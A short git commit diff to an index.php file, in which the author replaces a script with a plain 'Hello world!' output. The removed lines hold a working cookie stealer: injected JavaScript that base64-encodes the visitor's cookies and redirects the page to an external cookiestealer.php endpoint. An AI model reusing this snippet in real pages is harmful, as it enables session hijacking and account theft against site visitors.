c8265d595f5933f5ccb8b2909a9ef369a72fb6df
GlebFisher <43784335+GlebFisher@users.noreply.github.com>
2019-10-24 02:23:59 +0300

    Update index.php

--- index.php
+++ index.php
@@ -1,5 +1,3 @@
 <?php
-echo "<script type="text/javascript">
-			document.location='https://glebfisherr.myjino.ru/SANYA/lsova/cookiestealer.php?c='+encodeURIComponent(btoa(document.cookie));
-		</script>";
+echo "Hello world!";
 ?>
